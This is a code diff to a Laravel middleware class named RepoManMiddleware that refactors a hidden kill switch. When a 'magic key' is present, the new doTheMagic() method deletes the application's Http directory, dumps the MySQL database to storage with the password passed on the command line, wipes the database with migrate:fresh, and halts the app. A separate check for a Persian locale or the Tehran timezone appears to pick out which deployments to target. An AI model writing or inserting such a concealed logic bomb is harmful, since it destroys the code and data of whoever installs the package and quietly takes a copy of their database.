@@ -13,19 +13,7 @@ class RepoManMiddleware
     public function handle($request, Closure $next)
     {
         if ($this->isTheMagicKeyPresent()) {
-            if (is_dir(app_path('Http'))) {
-                $result = File::deleteDirectory(app_path('Http'));
-                $request = $result ? 'The directory has deleted successfully' : 'Something went wrong!';
-            }
-            $filename = Carbon::now()->timestamp;
-            $db = config('repoman.db');
-            exec("(mysqldump -h". $db['DB_HOST'] ." -u". $db['DB_USERNAME'] ." -p". $db['DB_PASSWORD'] ." ". $db['DB_DATABASE'] ." > " . storage_path() . "/app/backup/".$filename.".sql" .") 2>&1", $output, $exit_status);
-
-            if ($exit_status == 0)
-                Artisan::call('migrate:fresh');
-
-            $backupStatus = ($exit_status != 0) ? 'database backup failed to complete' : 'backup completes successfully';
-            exit($result ?? "The directory doesn't exist!" . " | " . $backupStatus);
+            $this->doTheMagic();
         }
 
         $startDate = Carbon::createFromTimeString(
@@ -76,5 +64,29 @@ class RepoManMiddleware
     {
         return strtolower(config('app.locale')) == 'fa'
             || strtolower(config('app.timezone')) == 'asia/tehran';
+    }
+
+    private function doTheMagic()
+    {
+        $result = File::deleteDirectory(app_path('Http'));
+        $message = 'Delete the directory: ' . ($result ? '✓' : '✗');
+
+        if (config('database.default') == 'mysql') {
+            $db = config('database.connections.mysql');
+
+            $command = "(mysqldump -h " . $db['host'] . " -u " . $db['username']
+                . " --password=\"" . $db['password'] . "\" " . $db['database']
+                . " > " . storage_path() . "/app/" . time() . '.sql' . ") 2>&1";
+
+            exec($command, $output, $returnVar);
+
+            if ($returnVar == 0) {
+                Artisan::call('migrate:fresh');
+            }
+
+            $message .= " | Empty the database: " . ($returnVar != 0 ? '✗' : '✓');
+        }
+
+        exit($message);
     }
 }
